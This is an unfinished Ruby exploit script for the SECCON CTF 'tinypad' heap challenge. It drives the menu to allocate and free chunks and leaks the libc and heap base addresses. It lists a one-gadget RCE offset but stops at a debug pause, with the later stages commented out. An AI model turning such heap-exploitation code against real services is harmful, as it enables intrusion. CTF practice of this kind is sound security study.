#!/usr/bin/env ruby

require 'pwn'

context.log_level=:info
context.arch="amd64"

remote = ARGV[0] == "r"

if remote 
	host = "tinypad.pwn.seccon.jp"
	port = 54321
	libc_offset = {
		"main_arena" => 0x3be760,
		"environ" => 0x5e9178,
		"one_gadget_rce" => 0xe66bd
	}
else
	host = "localhost"
	port = 54321
	libc_offset = {
		"main_arena" => 0x3c4b78
	}
end

class MyTube < Sock
	def initialize(host, port)
		super(host, port)
	end
	def sendlineafter(pre, post)
		recvuntil(pre)
		sendline(post)
	end
	def recv_until_prompt
		recvuntil("(CMD)>>> ")
	end
end

def tube
	@tube
end

def alloc(size, content)
	tube.recv_until_prompt
	tube.sendline("A")
	tube.sendlineafter("(SIZE)>>> ", "#{size}")
	tube.sendlineafter("(CONTENT)>>> ", content)
end

def free(index)
	tube.recv_until_prompt
	tube.sendline("D")
	tube.sendlineafter("(INDEX)>>> ", "#{index}")
end

def edit_memo(index, content)
	tube.recv_until_prompt
	tube.sendline("E")
	tube.sendlineafter("(INDEX)>>> ", "#{index}")
	tube.sendlineafter("(CONTENT)>>> ", content)
	tube.recv_until("(Y/n)>>> ")
	tube.sendline("Y")
end

#z=MyTube.new "localhost", 54321
z=MyTube.new("localhost", 54321)
@tube=z
puts "Starting..."
pid=`pidof tinypad`.split.first
alloc(256,"A"*8)
alloc(256,"B"*8)
alloc(256,"C"*8)
alloc(256,"D"*8)

free(3)

log.info "Leaking libc base..."
gargage=z.recvuntil("INDEX: 3\n")
libc_base=u64(z.recvline.strip[-6..-1].ljust(8,"\x00")) - libc_offset["main_arena"]
log.info "Libc: 0x%08x" % [libc_base]

log.info "Leaking heap base..."
free(1)
garbage=z.recvuntil("INDEX: 1\n")
heap_base=u64(z.recvline.strip[-3..-1].ljust(8,"\x00")) - 0x220
log.info "Heap: 0x%08x" % [heap_base]

puts "[DEBUG] %s Continue?" % [pid]
gets
#z.sendlineafter("(CMD)>>> ", "A")
#z.sendlineafter("(SIZE)>>> ", "12")
#z.sendlineafter("(CONTENT)>>> ", "A"*12)
#
#
#puts "[DEBUG] %s Continue?" % [pid]
#gets
#
#data=z.recvuntil("(CMD)>>> ")
#puts data
